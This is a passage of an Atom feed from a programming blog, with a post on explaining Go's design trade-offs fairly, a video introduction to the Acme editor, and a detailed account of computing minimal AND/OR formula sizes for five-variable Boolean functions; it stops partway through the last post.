    <content type="html">&#xA;&#xA;&lt;p&gt;&#xA;[&lt;i&gt;Cross-posting from last year’s &lt;a href=&#34;https://www.reddit.com/r/golang/comments/46bd5h/ama_we_are_the_go_contributors_ask_us_anything/d05yyde/?context=3&amp;st=ixq5hjko&amp;sh=7affd469&#34;&gt;Go contributors AMA&lt;/a&gt; on Reddit, because it’s still important to remember.&lt;/i&gt;]&#xA;&#xA;&lt;p&gt;&#xA;One of the perks of working on Go these past years has been the chance to have many great discussions with other language designers and implementers, for example about how well various design decisions worked out or the common problems of implementing what look like very different languages (for example both Go and Haskell need some kind of “green threads”, so there are more shared runtime challenges than you might expect). In one such conversation, when I was talking to a group of early Lisp hackers, one of them pointed out that these discussions are basically never dogmatic. Designers and implementers remember working through the good arguments on both sides of a particular decision, and they’re often eager to hear about someone else’s experience with what happens when you make that decision differently. Contrast that kind of discussion with the heated arguments or overly zealous statements you sometimes see from users of the same languages. There’s a real disconnect, possibly because the users don’t have the experience of weighing the arguments on both sides and don’t realize how easily a particular decision might have gone the other way.&#xA;&#xA;&lt;p&gt;&#xA;Language design and implementation is engineering. We make decisions using evaluations of costs and benefits or, if we must, using predictions of those based on past experience. I think we have an important responsibility to explain both sides of a particular decision, to make clear that the arguments for an alternate decision are actually good ones that we weighed and balanced, and to avoid the suggestion that particular design decisions approach dogma. I hope &lt;a href=&#34;https://www.reddit.com/r/golang/comments/46bd5h/ama_we_are_the_go_contributors_ask_us_anything/d05yyde/?context=3&amp;st=ixq5hjko&amp;sh=7affd469&#34;&gt;the Reddit AMA&lt;/a&gt; as well as discussion on &lt;a href=&#34;https://groups.google.com/group/golang-nuts&#34;&gt;golang-nuts&lt;/a&gt; or &lt;a href=&#34;http://stackoverflow.com/questions/tagged/go&#34;&gt;StackOverflow&lt;/a&gt; or the &lt;a href=&#34;https://forum.golangbridge.org/&#34;&gt;Go Forum&lt;/a&gt; or at &lt;a href=&#34;https://golang.org/wiki/Conferences&#34;&gt;conferences&lt;/a&gt; help with that.&#xA;&#xA;&lt;p&gt;&#xA;But we need help from everyone. Remember that none of the decisions in Go are infallible; they’re just our best attempts at the time we made them, not wisdom received on stone tablets. If someone asks why Go does X instead of Y, please try to present the engineering reasons fairly, including for Y, and avoid argument solely by appeal to authority. It’s too easy to fall into the “well that’s just not how it’s done here” trap. And now that I know about and watch for that trap, I see it in nearly every technical community, although some more than others.&#xA;</content>
  </entry>
  <entry>
    <title>A Tour of Acme</title>
    <id>tag:research.swtch.com,2012:research.swtch.com/acme</id>
    <link rel="alternate" href="http://research.swtch.com/acme"></link>
    <published>2012-09-17T11:00:00-04:00</published>
    <updated>2012-09-17T11:00:00-04:00</updated>
    <summary type="text">A video introduction to Acme, the Plan 9 text editor</summary>
    <content type="html">&#xA;&lt;p class=&#34;lp&#34;&gt;&#xA;People I work with recognize my computer easily:&#xA;it&#39;s the one with nothing but yellow windows and blue bars on the screen.&#xA;That&#39;s the text editor acme, written by Rob Pike for Plan 9 in the early 1990s.&#xA;Acme focuses entirely on the idea of text as user interface.&#xA;It&#39;s difficult to explain acme without seeing it, though, so I&#39;ve put together&#xA;a screencast explaining the basics of acme and showing a brief programming session.&#xA;Remember as you watch the video that the 854x480 screen is quite cramped.&#xA;Usually you&#39;d run acme on a larger screen: even my MacBook Air has almost four times&#xA;as much screen real estate.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;center&gt;&#xA;&lt;div style=&#34;border: 1px solid black; width: 853px; height: 480px;&#34;&gt;&lt;iframe width=&#34;853&#34; height=&#34;480&#34; src=&#34;https://www.youtube.com/embed/dP1xVpMPn8M?rel=0&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;&lt;/div&gt;&#xA;&lt;/center&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;The video doesn&#39;t show everything acme can do, nor does it show all the ways you can use it.&#xA;Even small idioms like where you type text to be loaded or executed vary from user to user.&#xA;To learn more about acme, read Rob Pike&#39;s paper &amp;ldquo;&lt;a href=&#34;/acme.pdf&#34;&gt;Acme: A User Interface for Programmers&lt;/a&gt;&amp;rdquo; and then try it.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Acme runs on most operating systems.&#xA;If you use &lt;a href=&#34;https://9p.io/&#34;&gt;Plan 9 from Bell Labs&lt;/a&gt;, you already have it.&#xA;If you use FreeBSD, Linux, OS X, or most other Unix clones, you can get it as part of &lt;a href=&#34;http://swtch.com/plan9port/&#34;&gt;Plan 9 from User Space&lt;/a&gt;.&#xA;If you use Windows, I suggest trying acme as packaged in &lt;a href=&#34;http://code.google.com/p/acme-sac/&#34;&gt;acme stand alone complex&lt;/a&gt;, which is based on the Inferno programming environment.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=lp&gt;&lt;b&gt;Mini-FAQ&lt;/b&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;i&gt;Q. Can I use scalable fonts?&lt;/i&gt; A. On the Mac, yes. If you run &lt;code&gt;acme -f /mnt/font/Monaco/16a/font&lt;/code&gt; you get 16-point anti-aliased Monaco as your font, served via &lt;a href=&#34;http://swtch.com/plan9port/man/man4/fontsrv.html&#34;&gt;fontsrv&lt;/a&gt;. If you&#39;d like to add X11 support to fontsrv, I&#39;d be happy to apply the patch.&#xA;&lt;li&gt;&lt;i&gt;Q. Do I need X11 to build on the Mac?&lt;/i&gt; A. No. The build will complain that it cannot build &amp;lsquo;snarfer&amp;rsquo; but it should complete otherwise. You probably don&#39;t need snarfer.&#xA;&lt;/ul&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;If you&#39;re interested in history, the predecessor to acme was called help. Rob Pike&#39;s paper &amp;ldquo;&lt;a href=&#34;/help.pdf&#34;&gt;A Minimalist Global User Interface&lt;/a&gt;&amp;rdquo; describes it. See also &amp;ldquo;&lt;a href=&#34;/sam.pdf&#34;&gt;The Text Editor sam&lt;/a&gt;&amp;rdquo;&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;&lt;i&gt;Correction&lt;/i&gt;: the smiley program in the video was written by Ken Thompson.&#xA;I got it from Dennis Ritchie, the more meticulous archivist of the pair.&#xA;&lt;/p&gt;&#xA;&#xA;</content>
  </entry>
  <entry>
    <title>Minimal Boolean Formulas</title>
    <id>tag:research.swtch.com,2012:research.swtch.com/boolean</id>
    <link rel="alternate" href="http://research.swtch.com/boolean"></link>
    <published>2011-05-18T00:00:00-04:00</published>
    <updated>2011-05-18T00:00:00-04:00</updated>
    <summary type="text">Simplify equations with God</summary>
    <content type="html">&#xA;&lt;p&gt;&lt;style type=&#34;text/css&#34;&gt;&#xA;p { line-height: 150%; }&#xA;blockquote { text-align: left; }&#xA;pre.alg { font-family: sans-serif; font-size: 100%; margin-left: 60px; }&#xA;td, th { padding-left; 5px; padding-right: 5px; vertical-align: top; }&#xA;#times td { text-align: right; }&#xA;table { padding-top: 1em; padding-bottom: 1em; }&#xA;#find td { text-align: center; }&#xA;&lt;/style&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;&lt;a href=&#34;http://oeis.org/A056287&#34;&gt;28&lt;/a&gt;.&#xA;That&#39;s the minimum number of AND or OR operators&#xA;you need in order to write any Boolean function of five variables.&#xA;&lt;a href=&#34;http://alexhealy.net/&#34;&gt;Alex Healy&lt;/a&gt; and I computed that in April 2010.  Until then,&#xA;I believe no one had ever known that little fact.&#xA;This post describes how we computed it&#xA;and how we almost got scooped by &lt;a href=&#34;http://research.swtch.com/2011/01/knuth-volume-4a.html&#34;&gt;Knuth&#39;s Volume 4A&lt;/a&gt;&#xA;which considers the problem for AND, OR, and XOR.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;h3&gt;A Naive Brute Force Approach&lt;/h3&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Any Boolean function of two variables&#xA;can be written with at most 3 AND or OR operators: the parity function&#xA;on two variables X XOR Y is (X AND Y&#39;) OR (X&#39; AND Y), where X&#39; denotes&#xA;&amp;ldquo;not X.&amp;rdquo;  We can shorten the notation by writing AND and OR&#xA;like multiplication and addition: X XOR Y = X*Y&#39; + X&#39;*Y.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;For three variables, parity is also a hardest function, requiring 9 operators:&#xA;X XOR Y XOR Z = (X*Z&#39;+X&#39;*Z+Y&#39;)*(X*Z+X&#39;*Z&#39;+Y).&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;For four variables, parity is still a hardest function, requiring 15 operators:&#xA;W XOR X XOR Y XOR Z = (X*Z&#39;+X&#39;*Z+W&#39;*Y+W*Y&#39;)*(X*Z+X&#39;*Z&#39;+W*Y+W&#39;*Y&#39;).&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;The sequence so far prompts a few questions.  Is parity always a hardest function?&#xA;Does the minimum number of operators alternate between 2&lt;sup&gt;n&lt;/sup&gt;&amp;#8722;1 and 2&lt;sup&gt;n&lt;/sup&gt;+1?&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;I computed these results in January 2001 after hearing&#xA;the problem from Neil Sloane, who suggested it as a variant&#xA;of a similar problem first studied by Claude Shannon.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;The program I wrote to compute a(4) computes the minimum number of&#xA;operators for every Boolean function of n variables&#xA;in order to find the largest minimum over all functions.&#xA;There are 2&lt;sup&gt;4&lt;/sup&gt; = 16 settings of four variables, and each function&#xA;can pick its own value for each setting, so there are 2&lt;sup&gt;16&lt;/sup&gt; different&#xA;functions.  To make matters worse, you build new functions&#xA;by taking pairs of old functions and joining them with AND or OR.&#xA;2&lt;sup&gt;16&lt;/sup&gt; different functions means 2&lt;sup&gt;16&lt;/sup&gt;&amp;#183;2&lt;sup&gt;16&lt;/sup&gt; = 2&lt;sup&gt;32&lt;/sup&gt; pairs of functions.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;The program I wrote was a mangling of the Floyd-Warshall&#xA;all-pairs shortest paths algorithm.  That algorithm is:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre class=&#34;indent alg&#34;&gt;&#xA;// Floyd-Warshall all pairs shortest path&#xA;func compute():&#xA;    for each node i&#xA;        for each node j&#xA;            dist[i][j] = direct distance, or &amp;#8734;&#xA;&#xA;    for each node k&#xA;        for each node i&#xA;            for each node j&#xA;                d = dist[i][k] + dist[k][j]&#xA;                if d &amp;lt; dist[i][j]&#xA;                    dist[i][j] = d&#xA;    return&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;The algorithm begins with the distance table dist[i][j] set to&#xA;an actual distance if i is connected to j and infinity otherwise.&#xA;Then each round updates the table to account for paths&#xA;going through the node k: if it&#39;s shorter to go from i to k to j,&#xA;it saves that shorter distance in the table.  The nodes are&#xA;numbered from 0 to n, so the variables i, j, k are simply integers.&#xA;Because there are only n nodes, we know we&#39;ll be done after&#xA;the outer loop finishes.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;The program I wrote to find minimum Boolean formula sizes is&#xA;an adaptation, substituting formula sizes for distance.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre class=&#34;indent alg&#34;&gt;&#xA;// Algorithm 1&#xA;func compute()&#xA;    for each function f&#xA;        size[f] = &amp;#8734;&#xA;&#xA;    for each single variable function f = v&#xA;        size[f] = 0&#xA;&#xA;    loop&#xA;        changed = false&#xA;        for each function f&#xA;            for each function g&#xA;                d = size[f] + 1 + size[g]&#xA;                if d &amp;lt; size[f OR g]&#xA;                    size[f OR g] = d&#xA;                    changed = true&#xA;                if d &amp;lt; size[f AND g]&#xA;                    size[f AND g] = d&#xA;                    changed = true&#xA;        if not changed&#xA;            return&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;Algorithm 1 runs the same kind of iterative update loop as the Floyd-Warshall algorithm,&#xA;but it isn&#39;t as obvious when you can stop, because you don&#39;t&#xA;know the maximum formula size beforehand.&#xA;So it runs until a round doesn&#39;t find any new functions to make,&#xA;iterating until it finds a fixed point.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;The pseudocode above glosses over some details, such as&#xA;the fact that the per-function loops can iterate over a&#xA;queue of functions known to have finite size, so that each&#xA;loop omits the functions that aren&#39;t&#xA;yet known.  That&#39;s only a constant factor improvement,&#xA;but it&#39;s a useful one.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Another important detail missing above&#xA;is the representation of functions.  The most convenient&#xA;representation is a binary truth table.&#xA;For example,&#xA;if we are computing the complexity of two-variable functions,&#xA;there are four possible inputs, which we can number as follows.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;center&gt;&#xA;&lt;table&gt;&#xA;&lt;tr&gt;&lt;th&gt;X &lt;th&gt;Y &lt;th&gt;Value&#xA;&lt;tr&gt;&lt;td&gt;false &lt;td&gt;false &lt;td&gt;00&lt;sub&gt;2&lt;/sub&gt; = 0&#xA;&lt;tr&gt;&lt;td&gt;false &lt;td&gt;true &lt;td&gt;01&lt;sub&gt;2&lt;/sub&gt; = 1&#xA;&lt;tr&gt;&lt;td&gt;true &lt;td&gt;false &lt;td&gt;10&lt;sub&gt;2&lt;/sub&gt; = 2&#xA;&lt;tr&gt;&lt;td&gt;true &lt;td&gt;true &lt;td&gt;11&lt;sub&gt;2&lt;/sub&gt; = 3&#xA;&lt;/table&gt;&#xA;&lt;/center&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;The functions are then the 4-bit numbers giving the value of the&#xA;function for each input.  For example, function 13 = 1101&lt;sub&gt;2&lt;/sub&gt;&#xA;is true for all inputs except X=false Y=true.&#xA;Three-variable functions correspond to 3-bit inputs generating 8-bit truth tables,&#xA;and so on.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;This representation has two key advantages.  The first is that&#xA;the numbering is dense, so that you can implement a map keyed&#xA;by function using a simple array.  The second is that the operations&#xA;&amp;ldquo;f AND g&amp;rdquo; and &amp;ldquo;f OR g&amp;rdquo; can be implemented using&#xA;bitwise operators: the truth table for &amp;ldquo;f AND g&amp;rdquo; is the bitwise&#xA;AND of the truth tables for f and g.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;That program worked well enough in 2001 to compute the&#xA;minimum number of operators necessary to write any&#xA;1-, 2-, 3-, and 4-variable Boolean function.  Each round&#xA;takes asymptotically O(2&lt;sup&gt;2&lt;sup&gt;n&lt;/sup&gt;&lt;/sup&gt;&amp;#183;2&lt;sup&gt;2&lt;sup&gt;n&lt;/sup&gt;&lt;/sup&gt;) = O(2&lt;sup&gt;2&lt;sup&gt;n+1&lt;/sup&gt;&lt;/sup&gt;) time, and the number of&#xA;rounds needed is O(the final answer).  The answer for n=4&#xA;is 15, so the computation required on the order of&#xA;15&amp;#183;2&lt;sup&gt;2&lt;sup&gt;5&lt;/sup&gt;&lt;/sup&gt; = 15&amp;#183;2&lt;sup&gt;32&lt;/sup&gt; iterations of the innermost loop.&#xA;That was plausible on the computer I was using at&#xA;the time, but the answer for n=5, likely around 30,&#xA;would need 30&amp;#183;2&lt;sup&gt;64&lt;/sup&gt; iterations to compute, which&#xA;seemed well out of reach.&#xA;At the time, it seemed plausible that parity was always&#xA;a hardest function and that the minimum size would&#xA;continue to alternate between 2&lt;sup&gt;n&lt;/sup&gt;&amp;#8722;1 and 2&lt;sup&gt;n&lt;/sup&gt;+1.&#xA;It&#39;s a nice pattern.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;h3&gt;Exploiting Symmetry&lt;/h3&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Five years later, though, Alex Healy and I got to talking about this sequence,&#xA;and Alex shot down both conjectures using results from the theory&#xA;of circuit complexity.  (Theorists!)  Neil Sloane added this note to&#xA;the &lt;a href=&#34;http://oeis.org/history?seq=A056287&#34;&gt;entry for the sequence&lt;/a&gt; in his Online Encyclopedia of Integer Sequences:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;blockquote&gt;&#xA;&lt;tt&gt;&#xA;%E A056287 Russ Cox conjectures that X&lt;sub&gt;1&lt;/sub&gt; XOR ... XOR X&lt;sub&gt;n&lt;/sub&gt; is always a worst f and that a(5) = 33 and a(6) = 63. But (Jan 27 2006) Alex Healy points out that this conjecture is definitely false for large n. So what is a(5)?&#xA;&lt;/tt&gt;&#xA;&lt;/blockquote&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;Indeed.  What is a(5)?  No one knew, and it wasn&#39;t obvious how to find out.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;In January 2010, Alex and I started looking into ways to&#xA;speed up the computation for a(5).  30&amp;#183;2&lt;sup&gt;64&lt;/sup&gt; is too many&#xA;iterations but maybe we could find ways to cut that number.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;In general, if we can identify a class of functions f whose&#xA;members are guaranteed to have the same complexity,&#xA;then we can save just one representative of the class as&#xA;long as we recreate the entire class in the loop body.&#xA;What used to be:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre class=&#34;indent alg&#34;&gt;&#xA;for each function f&#xA;    for each function g&#xA;        visit f AND g&#xA;        visit f OR g&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;can be rewritten as&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre class=&#34;indent alg&#34;&gt;&#xA;for each canonical function f&#xA;    for each canonical function g&#xA;        for each ff equivalent to f&#xA;            for each gg equivalent to g&#xA;                visit ff AND gg&#xA;                visit ff OR gg&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;That doesn&#39;t look like an improvement: it&#39;s doing all&#xA;the same work.  But it can open the door to new optimizations&#xA;depending on the equivalences chosen.&#xA;For example, the functions &amp;ldquo;f&amp;rdquo; and &amp;ldquo;&amp;#172;f&amp;rdquo; are guaranteed&#xA;to have the same complexity, by &lt;a href=&#34;http://en.wikipedia.org/wiki/De_Morgan&#39;s_laws&#34;&gt;DeMorgan&#39;s laws&lt;/a&gt;.&#xA;If we keep just one of&#xA;those two on the lists that &amp;ldquo;for each function&amp;rdquo; iterates over,&#xA;we can unroll the inner two loops, producing:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre class=&#34;indent alg&#34;&gt;&#xA;for each canonical function f&#xA;    for each canonical function g&#xA;        visit f OR g&#xA;        visit f AND g&#xA;        visit &amp;#172;f OR g&#xA;        visit &amp;#172;f AND g&#xA;        visit f OR &amp;#172;g&#xA;        visit f AND &amp;#172;g&#xA;        visit &amp;#172;f OR &amp;#172;g&#xA;        visit &amp;#172;f AND &amp;#172;g&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;That&#39;s still not an improvement, but it&#39;s no worse.&#xA;Each of the two loops considers half as many functions&#xA;but the inner iteration is four times longer.&#xA;Now we can notice that half of tests aren&#39;t&#xA;worth doing: &amp;ldquo;f AND g&amp;rdquo; is the negation of&#xA;&amp;ldquo;&amp;#172;f OR &amp;#172;g,&amp;rdquo; and so on, so only half&#xA;of them are necessary.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Let&#39;s suppose that when choosing between &amp;ldquo;f&amp;rdquo; and &amp;ldquo;&amp;#172;f&amp;rdquo;&#xA;we keep the one that is false when presented with all true inputs.&#xA;(This has the nice property that &lt;code&gt;f ^ (int32(f) &amp;gt;&amp;gt; 31)&lt;/code&gt;&#xA;is the truth table for the canonical form of &lt;code&gt;f&lt;/code&gt;.)&#xA;Then we can tell which combinations above will produce&#xA;canonical functions when f and g are already canonical:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre class=&#34;indent alg&#34;&gt;&#xA;for each canonical function f&#xA;    for each canonical function g&#xA;        visit f OR g&#xA;        visit f AND g&#xA;        visit &amp;#172;f AND g&#xA;        visit f AND &amp;#172;g&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;That&#39;s a factor of two improvement over the original loop.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Another observation is that permuting&#xA;the inputs to a function doesn&#39;t change its complexity:&#xA;&amp;ldquo;f(V, W, X, Y, Z)&amp;rdquo; and &amp;ldquo;f(Z, Y, X, W, V)&amp;rdquo; will have the same&#xA;minimum size.  For complex functions, each of the&#xA;5! = 120 permutations will produce a different truth table.&#xA;A factor of 120 reduction in storage is good but again&#xA;we have the problem of expanding the class in the&#xA;iteration.  This time, there&#39;s a different trick for reducing&#xA;the work in the innermost iteration.&#xA;Since we only need to produce one member of&#xA;the equivalence class, it doesn&#39;t make sense to&#xA;permute the inputs to both f and g.  Instead,&#xA;permuting just the inputs to f while fixing g&#xA;is guaranteed to hit at least one member&#xA;of each class that permuting both f and g would.&#xA;So we gain the factor of 120 twice in the loops&#xA;and lose it once in the iteration, for a net savings&#xA;of 120.&#xA;(In some ways, this is the same trick we did with &amp;ldquo;f&amp;rdquo; vs &amp;ldquo;&amp;#172;f.&amp;rdquo;)&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;A final observation is that negating any of the inputs&#xA;to the function doesn&#39;t change its complexity,&#xA;because X and X&#39; have the same complexity.&#xA;The same argument we used for permutations applies&#xA;here, for another constant factor of 2&lt;sup&gt;5&lt;/sup&gt; = 32.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;The code stores a single function for each equivalence class&#xA;and then recomputes the equivalent functions for f, but not g.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre class=&#34;indent alg&#34;&gt;&#xA;for each canonical function f&#xA;    for each function ff equivalent to f&#xA;        for each canonical function g&#xA;            visit ff OR g&#xA;            visit ff AND g&#xA;            visit &amp;#172;ff AND g&#xA;            visit ff AND &amp;#172;g&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;In all, we just got a savings of 2&amp;#183;120&amp;#183;32 = 7680,&#xA;cutting the total number of iterations from 30&amp;#183;2&lt;sup&gt;64&lt;/sup&gt; = 5&amp;#215;10&lt;sup&gt;20&lt;/sup&gt;&#xA;to 7&amp;#215;10&lt;sup&gt;16&lt;/sup&gt;.  If you figure we can do around&#xA;10&lt;sup&gt;9&lt;/sup&gt; iterations per second, that&#39;s still 800 days of CPU time.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;The full algorithm at this point is:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre class=&#34;indent alg&#34;&gt;&#xA;// Algorithm 2&#xA;func compute():&#xA;    for each function f&#xA;        size[f] = &amp;#8734;&#xA;&#xA;    for each single variable function f = v&#xA;        size[f] = 0&#xA;&#xA;    loop&#xA;        changed = false&#xA;        for each canonical function f&#xA;            for each function ff equivalent to f&#xA;                for each canonical function g&#xA;                    d = size[ff] + 1 + size[g]&#xA;                    changed |= visit(d, ff OR g)&#xA;                    changed |= visit(d, ff AND g)&#xA;                    changed |= visit(d, ff AND &amp;#172;g)&#xA;                    changed |= visit(d, &amp;#172;ff AND g)&#xA;        if not changed&#xA;            return&#xA;&#xA;func visit(d, fg):&#xA;    if size[fg] != &amp;#8734;&#xA;        return false&#xA;&#xA;    record fg as canonical&#xA;&#xA;    for each function ffgg equivalent to fg&#xA;        size[ffgg] = d&#xA;    return true&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;The helper function &amp;ldquo;visit&amp;rdquo; must set the size not only of its argument fg&#xA;but also all equivalent functions under permutation or inversion of the inputs,&#xA;so that future tests will see that they have been computed.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;h3&gt;Methodical Exploration&lt;/h3&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;There&#39;s one final improvement we can make.&#xA;The approach of looping until things stop changing&#xA;considers each function pair multiple times&#xA;as their sizes go down.  Instead, we can consider functions&#xA;in order of complexity, so that the main loop&#xA;builds first all the functions of minimum complexity 1,&#xA;then all the functions of minimum complexity 2,&#xA;and so on.  If we do that, we&#39;ll consider each function pair at most once.&#xA;We can stop when all functions are accounted for.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Applying this idea to Algorithm 1 (before canonicalization) yields:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre class=&#34;indent alg&#34;&gt;&#xA;// Algorithm 3&#xA;func compute()&#xA;    for each function f&#xA;        size[f] = &amp;#8734;&#xA;&#xA;    for each single variable function f = v&#xA;        size[f] = 0&#xA;&#xA;    for k = 1 to &amp;#8734;&#xA;        for each function f&#xA;            for each function g of size k &amp;#8722; size(f) &amp;#8722; 1&#xA;                if size[f AND g] == &amp;#8734;&#xA;                    size[f AND g] = k&#xA;                    nsize++&#xA;                if size[f OR g] == &amp;#8734;&#xA;                    size[f OR g] = k&#xA;                    nsize++&#xA;        if nsize == 2&lt;sup&gt;2&lt;sup&gt;n&lt;/sup&gt;&lt;/sup&gt;&#xA;            return&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;Applying the idea to Algorithm 2 (after canonicalization) yields:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre class=&#34;indent alg&#34;&gt;&#xA;// Algorithm 4&#xA;func compute():&#xA;    for each function f&#xA;        size[f] = &amp;#8734;&#xA;&#xA;    for each single variable function f = v&#xA;        size[f] = 0&#xA;&#xA;    for k = 1 to &amp;#8734;&#xA;        for each canonical function f&#xA;            for each function ff equivalent to f&#xA;                for each canonical function g of size k &amp;#8722; size(f) &amp;#8722; 1&#xA;                    visit(k, ff OR g)&#xA;                    visit(k, ff AND g)&#xA;                    visit(k, ff AND &amp;#172;g)&#xA;                    visit(k, &amp;#172;ff AND g)&#xA;        if nvisited == 2&lt;sup&gt;2&lt;sup&gt;n&lt;/sup&gt;&lt;/sup&gt;&#xA;            return&#xA;&#xA;func visit(d, fg):&#xA;    if size[fg] != &amp;#8734;&#xA;        return&#xA;&#xA;    record fg as canonical&#xA;&#xA;    for each function ffgg equivalent to fg&#xA;        if size[ffgg] != &amp;#8734;&#xA;            size[ffgg] = d&#xA;            nvisited += 2  // counts ffgg and &amp;#172;ffgg&#xA;    return&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;The original loop in Algorithms 1 and 2 considered each pair f, g in every&#xA;iteration of the loop after they were computed.&#xA;The new loop in Algorithms 3 and 4 considers each pair f, g only once,&#xA;when k = size(f) + size(g) + 1.  This removes the&#xA;leading factor of 30 (the number of times we&#xA;expected the first loop to run) from our estimation&#xA;of the run time.&#xA;Now the expected number of iterations is around&#xA;2&lt;sup&gt;64&lt;/sup&gt;/7680 = 2.4&amp;#215;10&lt;sup&gt;15&lt;/sup&gt;.  If we can do 10&lt;sup&gt;9&lt;/sup&gt; iterations&#xA;per second, that&#39;s only 28 days of CPU time,&#xA;which I can deliver if you can wait a month.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Our estimate does not include the fact that not all function pairs need&#xA;to be considered.  For example, if the maximum size is 30, then the&#xA;functions of size 14 need never be paired against the functions of size 16,&#xA;because any result would have size 14+1+16 = 31.&#xA;So even 2.4&amp;#215;10&lt;sup&gt;15&lt;/sup&gt; is an overestimate, but it&#39;s in the right ballpark.&#xA;(With hindsight I can report that only 1.7&amp;#215;10&lt;sup&gt;14&lt;/sup&gt; pairs need to be considered&#xA;but also that our estimate of 10&lt;sup&gt;9&lt;/sup&gt; iterations&#xA;per second was optimistic.  The actual calculation ran for 20 days,&#xA;an average of about 10&lt;sup&gt;8&lt;/sup&gt; iterations per second.)&#xA;&lt;/p&gt;&#xA;&#xA;&lt;h3&gt;Endgame: Directed Search&lt;/h3&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;A month is still a long time to wait, and we can do better.&#xA;Near the end (after k is bigger than, say, 22), we are exploring&#xA;the fairly large space of function pairs in hopes of finding a&#xA;fairly small number of remaining functions.&#xA;At that point it makes sense to change from the&#xA;bottom-up &amp;ldquo;bang things together and see what we make&amp;rdquo;&#xA;to the top-down &amp;ldquo;try to make this one of these specific functions.&amp;rdquo;&#xA;That is, the core of the current search is:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre class=&#34;indent alg&#34;&gt;&#xA;for each canonical function f&#xA;    for each function ff equivalent to f&#xA;        for each canonical function g of size k &amp;#8722; size(f) &amp;#8722; 1&#xA;            visit(k, ff OR g)&#xA;            visit(k, ff AND g)&#xA;            visit(k, ff AND &amp;#172;g)&#xA;            visit(k, &amp;#172;ff AND g)&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;We can change it to:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre class=&#34;indent alg&#34;&gt;&#xA;for each missing function fg&#xA;    for each canonical function g&#xA;        for all possible f such that one of these holds&#xA;                * fg = f OR g&#xA;                * fg = f AND g&#xA;                * fg = &amp;#172;f AND g&#xA;                * fg = f AND &amp;#172;g&#xA;            if size[f] == k &amp;#8722; size(g) &amp;#8722; 1&#xA;                visit(k, fg)&#xA;                next fg&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;By the time we&#39;re at the end, exploring all the possible f to make&#xA;the missing functions&amp;#8212;a directed search&amp;#8212;is much less work than&#xA;the brute force of exploring all combinations.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;As an example, 